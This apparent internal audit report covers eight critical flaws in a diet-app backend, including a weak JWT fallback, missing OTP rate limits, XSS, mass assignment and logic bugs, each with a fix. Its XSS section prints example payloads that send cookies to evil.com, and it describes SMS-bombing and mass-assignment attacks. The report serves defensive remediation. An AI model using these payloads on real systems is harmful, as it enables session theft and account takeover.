# 01 - Critical / Breaking Issues

> These 8 issues **will** cause production failures, data corruption, or security breaches. Each must be resolved before any public launch.

---

## 1.1 Hardcoded JWT Secret with Weak Default

**Severity:** CRITICAL
**Category:** Authentication Bypass
**File:** `backend/src/middleware/clientAuth.middleware.ts` line 15

### The Problem

```typescript
const JWT_SECRET = process.env.CLIENT_JWT_SECRET || 'client-secret-change-in-production';
```

The JWT secret used to sign and verify client authentication tokens has a hardcoded fallback value. This fallback is **visible in the source code** to anyone with repository access.

### Why This Is Dangerous

1. **If `CLIENT_JWT_SECRET` is not set in the production `.env` file**, the server silently falls back to `'client-secret-change-in-production'`.
2. An attacker who knows this string (from reading the source code, a leaked repo, or a disgruntled team member) can **forge valid JWT tokens** for any client.
3. A forged token looks like:
   ```json
   { "clientId": "any-valid-uuid-here" }
   ```
4. The middleware at line 34 then does `prisma.client.findUnique({ where: { id: decoded.clientId } })` — which succeeds for any valid client UUID.
5. **Result:** Full impersonation of any client account — their meals, weight logs, photos, medical data, everything.

### How to Detect If You're Vulnerable

```bash
# Check if the env var is set in your deployment
grep CLIENT_JWT_SECRET .env
# If this returns nothing, you are vulnerable RIGHT NOW
```

### The Fix

```typescript
// backend/src/middleware/clientAuth.middleware.ts

const JWT_SECRET = process.env.CLIENT_JWT_SECRET;

if (!JWT_SECRET) {
    throw new Error(
        'FATAL: CLIENT_JWT_SECRET environment variable is not set. ' +
        'The server cannot start without a JWT secret. ' +
        'Generate one with: node -e "console.log(require(\'crypto\').randomBytes(64).toString(\'hex\'))"'
    );
}
```

### Additional Steps

1. Generate a strong secret:
   ```bash
   node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
   ```
2. Add it to `.env`:
   ```
   CLIENT_JWT_SECRET=<generated-hex-string>
   ```
3. Add `CLIENT_JWT_SECRET` to `.env.example` as a placeholder.
4. **Rotate the secret** if the codebase was ever public or shared — any previously issued tokens signed with the hardcoded fallback are compromised.

### Impact Radius

- All client-app users (mobile app)
- All data accessible via client API: meals, weight logs, photos, preferences, medical info
- Does NOT affect admin/dietitian auth (that uses Clerk)

---

## 1.2 No Rate Limiting on OTP Endpoint

**Severity:** CRITICAL
**Category:** Brute Force / SMS Flooding
**File:** `backend/src/routes/clientAuth.routes.ts`

### The Problem

The OTP (One-Time Password) authentication flow has two endpoints:
1. `POST /client-auth/request-otp` — sends an SMS with a code
2. `POST /client-auth/verify-otp` — verifies the code

Neither endpoint has rate limiting.

### Attack Scenarios

#### Scenario A: OTP Brute Force
- OTP codes are typically 4-6 digits (10,000 to 1,000,000 combinations).
- An attacker can send thousands of `verify-otp` requests per second.
- With a 6-digit code: ~500,000 attempts average to find the correct code.
- At 100 requests/second, this takes ~83 minutes — well within most OTP expiry windows (typically 5-10 minutes for a single code, but the attacker can request a new one).

#### Scenario B: SMS Flooding
- An attacker can call `request-otp` in a loop for any phone number.
- Each call triggers an SMS send, costing money (typically $0.01-0.05 per SMS).
- 100,000 requests = $1,000-$5,000 in SMS costs.
- The victim's phone is flooded with OTP messages.

#### Scenario C: SMS Bombing as Harassment
- Target a victim's phone number with thousands of OTP requests.
- Their phone becomes unusable from constant SMS notifications.

### The Fix

```typescript
// backend/src/middleware/rateLimiter.ts
import rateLimit from 'express-rate-limit';

// OTP request: max 3 per phone per 5 minutes
export const otpRequestLimiter = rateLimit({
    windowMs: 5 * 60 * 1000, // 5 minutes
    max: 3,
    keyGenerator: (req) => req.body.phone || req.ip,
    message: {
        success: false,
        error: {
            code: 'RATE_LIMITED',
            message: 'Too many OTP requests. Please try again in 5 minutes.'
        }
    },
    standardHeaders: true,
    legacyHeaders: false,
});

// OTP verification: max 5 attempts per phone per 5 minutes
export const otpVerifyLimiter = rateLimit({
    windowMs: 5 * 60 * 1000,
    max: 5,
    keyGenerator: (req) => req.body.phone || req.ip,
    message: {
        success: false,
        error: {
            code: 'RATE_LIMITED',
            message: 'Too many verification attempts. Please request a new OTP.'
        }
    },
});

// Global API rate limit
export const apiLimiter = rateLimit({
    windowMs: 60 * 1000, // 1 minute
    max: 100,
    message: {
        success: false,
        error: { code: 'RATE_LIMITED', message: 'Too many requests.' }
    },
});
```

Apply to routes:
```typescript
// backend/src/routes/clientAuth.routes.ts
import { otpRequestLimiter, otpVerifyLimiter } from '../middleware/rateLimiter';

router.post('/request-otp', otpRequestLimiter, clientAuthController.requestOTP);
router.post('/verify-otp', otpVerifyLimiter, clientAuthController.verifyOTP);
```

### Additional Hardening

1. **Lock account after N failed attempts** — after 5 failed OTP verifications, block the phone number for 30 minutes.
2. **OTP expiry** — ensure OTPs expire after 5 minutes.
3. **OTP invalidation** — invalidate the OTP after first failed verification attempt (issue a new one).
4. **IP-based limiting** — also rate-limit by IP address, not just phone number.

---

## 1.3 XSS in PDF Print HTML Generator

**Severity:** CRITICAL
**Category:** Cross-Site Scripting (XSS)
**Files:**
- `backend/src/utils/pdfGenerator.ts` lines 350-364
- `backend/src/controllers/share.controller.ts` lines 156-157

### The Problem

User-provided data is interpolated directly into raw HTML without any escaping:

```typescript
// pdfGenerator.ts line 350
<h1>${plan.name}</h1>
${plan.client?.fullName ? `<p class="subtitle">Prepared for: ${plan.client.fullName}</p>` : ''}
```

```typescript
// pdfGenerator.ts line 302
<div class="meal-name">${meal.name}</div>
${meal.description ? `<p class="description">${meal.description}</p>` : ''}
```

```typescript
// share.controller.ts line 156-157 (email)
html: customMessage
    ? `<p>${customMessage}</p>${html}`
    : html,
```

### Attack Vectors

#### Vector 1: Stored XSS via Diet Plan Name
1. Dietitian creates a diet plan with name: `<img src=x onerror="document.location='https://evil.com/steal?c='+document.cookie">`
2. Anyone who opens the print view (`GET /share/diet-plans/:id/print`) executes this script.
3. The attacker steals session cookies, auth tokens, or injects a keylogger.

#### Vector 2: XSS via Email
1. Attacker sends a diet plan email with `customMessage`: `<script>fetch('https://evil.com/'+document.cookie)</script>`
2. If the email client renders HTML (most do), the script executes.
3. Modern email clients block `<script>` tags but not all injection vectors (e.g., `<img onerror>`, CSS-based attacks).

#### Vector 3: XSS via Food Item Names
1. A food item with name `<img src=x onerror=alert(1)>` gets rendered in the print view without escaping.
2. Since food items can be created by users via the admin dashboard, this is a real risk.

### The Fix

Create an HTML escaping utility:

```typescript
// backend/src/utils/htmlEscape.ts

const ESCAPE_MAP: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
};

export function escapeHtml(str: string | null | undefined): string {
    if (!str) return '';
    return str.replace(/[&<>"']/g, (char) => ESCAPE_MAP[char] || char);
}
```

Apply it everywhere in `pdfGenerator.ts`:

```typescript
import { escapeHtml } from './htmlEscape';

// Before:
`<h1>${plan.name}</h1>`

// After:
`<h1>${escapeHtml(plan.name)}</h1>`
```

Apply to `share.controller.ts`:
```typescript
// Before:
html: customMessage ? `<p>${customMessage}</p>${html}` : html,

// After:
html: customMessage ? `<p>${escapeHtml(customMessage)}</p>${html}` : html,
```

### Every Interpolation That Needs Escaping

In `generateMealPlanPrintHtml`:
- `plan.name` (line 350)
- `plan.client.fullName` (line 351)
- `meal.name` (line 302)
- `meal.description` (line 302)
- `meal.instructions` (line 304)
- `item.foodItem.name` (line 287)
- `label` from option labels (line 282)
- `plan.notesForClient` (line 364)

In `emailDietPlan`:
- `customMessage` (line 156)

---

## 1.4 No Input Validation on Client API Routes

**Severity:** CRITICAL
**Category:** Input Validation
**File:** `backend/src/routes/clientApi.routes.ts`

### The Problem

The client-facing API routes accept request bodies without Zod schema validation. While the admin API routes use validation middleware, the client API does not.

### Affected Endpoints

| Endpoint | What's Missing |
|----------|---------------|
| `PATCH /client/meals/:mealLogId/log` | No validation on `status`, `photoUrl`, `notes`, `chosenOptionGroup` |
| `POST /client/weight-logs` | Only checks `if (!weightKg \|\| !logDate)` — no type/range validation |
| `PUT /client/preferences` | Validates time format but passes remaining fields through without type checks |
| `POST /client/onboarding/step/:step` | Passes `req.body` directly to onboarding service |

### What Can Go Wrong

1. `status: "hacked"` — invalid enum value reaches Prisma, causing an unhandled DB error instead of a clean validation error.
2. `weightKg: -500` — negative weight gets stored.
3. `weightKg: "abc"` — string instead of number, may cause NaN calculations downstream.
4. `chosenOptionGroup: 999` — points to a non-existent option group.
5. `notes: "<script>...</script>"` — stored XSS if notes are rendered without escaping.

### The Fix

Create validation schemas for each endpoint and apply them:

```typescript
// backend/src/schemas/clientApi.schema.ts
import { z } from 'zod';

export const logMealSchema = z.object({
    status: z.enum(['eaten', 'skipped', 'substituted']).optional(),
    photoUrl: z.string().url().optional(),
    notes: z.string().max(1000).optional(),
    chosenOptionGroup: z.number().int().min(0).max(10).optional(),
});

export const createWeightLogSchema = z.object({
    weightKg: z.number().min(10).max(500),
    logDate: z.string().refine((val) => !isNaN(Date.parse(val)), 'Invalid date'),
    notes: z.string().max(500).optional(),
});

export const updatePreferencesSchema = z.object({
    breakfastTime: z.string().regex(/^([01]\d|2[0-3]):([0-5]\d)$/).optional(),
    lunchTime: z.string().regex(/^([01]\d|2[0-3]):([0-5]\d)$/).optional(),
    dinnerTime: z.string().regex(/^([01]\d|2[0-3]):([0-5]\d)$/).optional(),
    snackTime: z.string().regex(/^([01]\d|2[0-3]):([0-5]\d)$/).optional(),
    canCook: z.boolean().optional(),
    kitchenAvailable: z.boolean().optional(),
    hasDietaryCook: z.boolean().optional(),
    weekdayActivity: z.string().max(200).optional(),
    weekendActivity: z.string().max(200).optional(),
    sportOrHobby: z.string().max(200).optional(),
    generalNotes: z.string().max(1000).optional(),
});
```

Apply via validation middleware:
```typescript
import { validate } from '../middleware/validation.middleware';
import { logMealSchema, createWeightLogSchema } from '../schemas/clientApi.schema';

router.patch('/meals/:mealLogId/log', validate(logMealSchema), asyncHandler(...));
router.post('/weight-logs', validate(createWeightLogSchema), asyncHandler(...));
```

---

## 1.5 `updateClient` Passes Raw Body to Prisma

**Severity:** CRITICAL
**Category:** Mass Assignment / Privilege Escalation
**File:** `backend/src/services/client.service.ts` lines 152-168

### The Problem

```typescript
async updateClient(clientId: string, updateData: any, orgId: string) {
    const existing = await prisma.client.findFirst({ where: { id: clientId, orgId } });
    if (!existing) throw AppError.notFound('Client not found');

    if (updateData.dateOfBirth) {
        updateData.dateOfBirth = new Date(updateData.dateOfBirth);
    }

    const client = await prisma.client.update({
        where: { id: clientId },
        data: updateData, // ANY field can be set
    });
}
```

The `updateData` parameter is typed as `any` and is passed **directly** to Prisma's `update()`. This means any field in the `Client` model can be overwritten.

### Exploitable Fields

An attacker (or buggy frontend) can send:

```json
{
    "orgId": "different-org-uuid",
    "isActive": true,
    "onboardingCompleted": true,
    "referralCode": "STEAL-CODE",
    "referredByClientId": null,
    "createdByUserId": "any-user-id",
    "primaryDietitianId": "any-user-id"
}
```

### Impact

- **`orgId`**: Move a client to a different organization, bypassing all org-scoped access controls.
- **`isActive`**: Reactivate a deleted client.
- **`referralCode`**: Steal or override another client's referral code.
- **`primaryDietitianId`**: Reassign to a different dietitian (cross-org if combined with `orgId` change).
- **`onboardingCompleted`**: Skip onboarding checks.

### The Fix

Whitelist allowed fields explicitly:

```typescript
async updateClient(clientId: string, rawData: any, orgId: string) {
    const existing = await prisma.client.findFirst({ where: { id: clientId, orgId } });
    if (!existing) throw AppError.notFound('Client not found');

    // WHITELIST: Only these fields can be updated
    const ALLOWED_FIELDS = [
        'fullName', 'email', 'phone', 'dateOfBirth', 'gender',
        'heightCm', 'currentWeightKg', 'targetWeightKg',
        'activityLevel', 'dietaryPreferences', 'allergies',
        'medicalConditions', 'medications', 'healthNotes',
        'targetCalories', 'targetProteinG', 'targetCarbsG', 'targetFatsG',
        'intolerances', 'dietPattern', 'eggAllowed', 'eggAvoidDays',
        'dislikes', 'avoidCategories', 'likedFoods', 'preferredCuisines',
        'foodRestrictions',
    ] as const;

    const updateData: Record<string, any> = {};
    for (const field of ALLOWED_FIELDS) {
        if (rawData[field] !== undefined) {
            updateData[field] = rawData[field];
        }
    }

    if (updateData.dateOfBirth) {
        updateData.dateOfBirth = new Date(updateData.dateOfBirth);
    }

    const client = await prisma.client.update({
        where: { id: clientId },
        data: updateData,
        include: { primaryDietitian: { select: { id: true, fullName: true } } },
    });

    validationEngine.invalidateClientCache(clientId);
    logger.info('Client updated', { clientId: client.id });
    return client;
}
```

---

## 1.6 Missing `deletedAt` Filter in Queries

**Severity:** CRITICAL
**Category:** Data Integrity / Ghost Records
**Files:** Multiple services

### The Problem

The codebase uses soft-delete (`deletedAt` timestamp + `isActive` boolean) but doesn't consistently filter out deleted records.

### Affected Queries

| Service | Method | Issue |
|---------|--------|-------|
| `meal.service.ts:46` | `updateMeal` | Uses `findUnique` — no `deletedAt` check |
| `meal.service.ts:72` | `deleteMeal` | Uses `findUnique` — can re-delete already deleted meals |
| `mealLog.service.ts:14` | `createMealLog` | Checks meal exists but not if the diet plan `isActive` |
| `dietPlan.service.ts:125` | `updatePlan` | `findFirst` without `isActive: true` |
| `clientApi.routes.ts:271` | weight logs GET | No `deletedAt: null` filter on weight logs |
| `compliance.service.ts:215` | daily adherence | No `deletedAt` filter on meal logs |

### What Can Go Wrong

1. A deleted diet plan's meals can still be updated, creating orphan data.
2. Meal logs can be created for meals belonging to deleted/inactive plans.
3. Deleted weight logs still appear in the client's progress charts.
4. Compliance scores include data from deleted meal logs.

### The Fix

Create a Prisma middleware or helper that automatically adds soft-delete filters:

```typescript
// Option A: Prisma middleware (global)
// backend/src/utils/prisma.ts
prisma.$use(async (params, next) => {
    const SOFT_DELETE_MODELS = ['Client', 'DietPlan', 'Meal', 'MealLog', 'FoodItem', 'WeightLog'];

    if (SOFT_DELETE_MODELS.includes(params.model || '')) {
        if (params.action === 'findFirst' || params.action === 'findMany') {
            if (!params.args) params.args = {};
            if (!params.args.where) params.args.where = {};
            if (params.args.where.deletedAt === undefined) {
                params.args.where.deletedAt = null;
            }
        }
    }
    return next(params);
});
```

```typescript
// Option B: Manual fix (per-query) — more explicit
// meal.service.ts
const meal = await prisma.meal.findFirst({
    where: { id: mealId, deletedAt: null },
    include: { dietPlan: true },
});
if (!meal || meal.dietPlan.orgId !== orgId || meal.dietPlan.deletedAt !== null) {
    throw AppError.notFound('Meal not found');
}
```

---

## 1.7 Referral Benefit Calculation Race Condition

**Severity:** CRITICAL
**Category:** Off-by-One Bug / Financial Impact
**File:** `backend/src/services/client.service.ts` lines 89-107

### The Problem

```typescript
async processReferralBenefit(referrerId: string) {
    await prisma.$transaction(async (tx) => {
        const benefit = await tx.referralBenefit.upsert({
            where: { clientId: referrerId },
            create: { clientId: referrerId, referralCount: 1, freeMonthsEarned: 0 },
            update: { referralCount: { increment: 1 } },
        });

        // BUG: benefit.referralCount is ALREADY the post-increment value
        const newReferralCount = benefit.referralCount + 1; // Off by one!
        const newFreeMonths = Math.floor(newReferralCount / REFERRALS_PER_FREE_MONTH);
        // REFERRALS_PER_FREE_MONTH = 3

        if (newFreeMonths > benefit.freeMonthsEarned) {
            await tx.referralBenefit.update({
                where: { clientId: referrerId },
                data: { freeMonthsEarned: newFreeMonths },
            });
        }
    });
}
```

### The Bug Trace

**Scenario: First referral**
1. `upsert` creates with `referralCount: 1`
2. `benefit.referralCount` = 1
3. `newReferralCount` = 1 + 1 = **2** (should be 1)
4. `newFreeMonths` = floor(2/3) = 0 (correct by luck)

**Scenario: Second referral**
1. `upsert` increments: `referralCount` becomes 2
2. `benefit.referralCount` = 2
3. `newReferralCount` = 2 + 1 = **3** (should be 2)
4. `newFreeMonths` = floor(3/3) = **1** (free month awarded at 2 referrals instead of 3!)

**Scenario: Third referral**
1. `upsert` increments: `referralCount` becomes 3
2. `newReferralCount` = 3 + 1 = **4**
3. `newFreeMonths` = floor(4/3) = 1 (already earned, no additional award)

**Result:** Free months are awarded one referral early. At scale with `REFERRALS_PER_FREE_MONTH = 3`, every user gets free months after 2 referrals instead of 3.

### The Fix

```typescript
async processReferralBenefit(referrerId: string) {
    await prisma.$transaction(async (tx) => {
        const benefit = await tx.referralBenefit.upsert({
            where: { clientId: referrerId },
            create: { clientId: referrerId, referralCount: 1, freeMonthsEarned: 0 },
            update: { referralCount: { increment: 1 } },
        });

        // benefit.referralCount is ALREADY the new value after upsert
        const newFreeMonths = Math.floor(benefit.referralCount / REFERRALS_PER_FREE_MONTH);

        if (newFreeMonths > benefit.freeMonthsEarned) {
            await tx.referralBenefit.update({
                where: { clientId: referrerId },
                data: { freeMonthsEarned: newFreeMonths },
            });
        }
    });
}
```

---

## 1.8 `publishPlan` Doesn't Create MealLogs

**Severity:** CRITICAL
**Category:** Missing Core Feature
**File:** `backend/src/services/dietPlan.service.ts` lines 149-169

### The Problem

```typescript
async publishPlan(planId: string, orgId: string) {
    const plan = await prisma.dietPlan.findFirst({
        where: { id: planId, orgId },
        include: { meals: true },
    });
    if (!plan) throw AppError.notFound('Diet plan not found');

    const updated = await prisma.dietPlan.update({
        where: { id: planId },
        data: { status: 'active', publishedAt: new Date() },
    });

    return {
        planId: updated.id,
        status: updated.status,
        publishedAt: updated.publishedAt,
        mealLogsCreated: plan.meals.length, // LIE: nothing was created
    };
}
```

The method:
1. Sets the plan status to `active`
2. Returns `mealLogsCreated: plan.meals.length`
3. **Never actually creates any MealLog records**

### The Cascade of Problems

The client app's home screen (`GET /client/meals/today`) works around this:
1. It fetches the active plan with ALL meals.
2. It queries existing `MealLog` records for today.
3. For meals without a log, it generates synthetic IDs: `pending-{mealId}`.
4. When the client logs a meal, the `PATCH /client/meals/:mealLogId/log` handler detects the `pending-` prefix and creates the MealLog on-the-fly.

**Problems with this approach:**
- Compliance tracking doesn't know about pending meals (no DB records to query).
- Daily adherence calculations undercount total planned meals.
- Statistics like "meals planned vs eaten" are inaccurate.
- Race conditions when two requests try to create the same log simultaneously.
- The `@@unique([clientId, mealId, scheduledDate])` constraint can throw on concurrent creates.

### The Fix

Actually create MealLogs when a plan is published:

```typescript
async publishPlan(planId: string, orgId: string) {
    const plan = await prisma.dietPlan.findFirst({
        where: { id: planId, orgId },
        include: {
            meals: true,
            client: { select: { id: true } },
        },
    });

    if (!plan) throw AppError.notFound('Diet plan not found');
    if (!plan.clientId) throw AppError.badRequest('Cannot publish a template');

    // Determine date range for meal log creation
    const startDate = new Date(plan.startDate);
    const endDate = plan.endDate ? new Date(plan.endDate) : new Date(startDate);
    if (!plan.endDate) {
        endDate.setDate(endDate.getDate() + 6); // Default to 7 days
    }

    // Create meal logs for each day in the range
    const mealLogsToCreate: any[] = [];
    const currentDate = new Date(startDate);

    while (currentDate <= endDate) {
        const dayOfWeek = (currentDate.getDay() + 6) % 7; // Monday = 0

        const todaysMeals = plan.meals.filter(m =>
            m.dayOfWeek === dayOfWeek || m.dayOfWeek === null
        );

        for (const meal of todaysMeals) {
            mealLogsToCreate.push({
                orgId: plan.orgId,
                clientId: plan.clientId!,
                mealId: meal.id,
                scheduledDate: new Date(currentDate),
                scheduledTime: meal.timeOfDay,
                status: 'pending',
            });
        }

        currentDate.setDate(currentDate.getDate() + 1);
    }

    // Batch create with conflict handling
    const created = await prisma.$transaction([
        prisma.dietPlan.update({
            where: { id: planId },
            data: { status: 'active', publishedAt: new Date() },
        }),
        ...mealLogsToCreate.map(log =>
            prisma.mealLog.upsert({
                where: {
                    clientId_mealId_scheduledDate: {
                        clientId: log.clientId,
                        mealId: log.mealId,
                        scheduledDate: log.scheduledDate,
                    }
                },
                create: log,
                update: {}, // Don't overwrite existing logs
            })
        ),
    ]);

    logger.info('Diet plan published with meal logs', {
        planId,
        mealLogsCreated: mealLogsToCreate.length,
    });

    return {
        planId,
        status: 'active',
        publishedAt: new Date(),
        mealLogsCreated: mealLogsToCreate.length,
    };
}
```

### After This Fix

- Remove the `pending-{mealId}` workaround from `clientApi.routes.ts`
- Simplify the client app's meal logging flow (all logs have real UUIDs)
- Compliance and adherence calculations become accurate
- The daily adherence `mealsPlanned` count comes from actual DB records
